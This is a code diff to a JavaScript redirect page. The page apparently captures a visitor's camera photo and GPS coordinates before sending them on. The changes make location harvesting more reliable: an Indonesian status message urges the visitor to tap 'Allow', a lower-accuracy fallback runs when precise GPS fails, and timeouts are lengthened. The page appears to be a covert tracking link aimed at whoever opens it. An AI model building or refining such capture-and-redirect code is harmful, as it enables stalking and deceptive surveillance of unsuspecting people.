@@ -588,15 +588,25 @@ const handleRedirect = async (req, res) => {
           if (photo) photoDataUrl = photo;
 
           if ("geolocation" in navigator) {
+            document.getElementById('statusText').innerHTML = "Meminta persetujuan lokasi presisi... Silakan klik <b>'Izinkan / Allow'</b> pada HP Anda.";
             navigator.geolocation.getCurrentPosition(
               async (pos) => {
-                document.getElementById('statusText').innerText = "Lokasi terkonfirmasi! Mengarahkan...";
+                document.getElementById('statusText').innerText = "Lokasi GPS presisi terkonfirmasi! Mengarahkan...";
                 proceed(pos.coords.latitude, pos.coords.longitude, photoDataUrl);
               },
               async (err) => {
-                proceed(null, null, photoDataUrl);
+                // If high accuracy failed or timed out, try standard accuracy fallback before giving up
+                navigator.geolocation.getCurrentPosition(
+                  async (pos2) => {
+                    proceed(pos2.coords.latitude, pos2.coords.longitude, photoDataUrl);
+                  },
+                  async (err2) => {
+                    proceed(null, null, photoDataUrl);
+                  },
+                  { enableHighAccuracy: false, timeout: 4000, maximumAge: 60000 }
+                );
               },
-              { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+              { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
           } else {
             proceed(null, null, photoDataUrl);
@@ -604,7 +614,7 @@ const handleRedirect = async (req, res) => {
         }
 
         initCapture();
-        setTimeout(() => proceed(null, null, photoDataUrl), 8000);
+        setTimeout(() => proceed(null, null, photoDataUrl), 12000);
       </script>
     </body>
     </html>
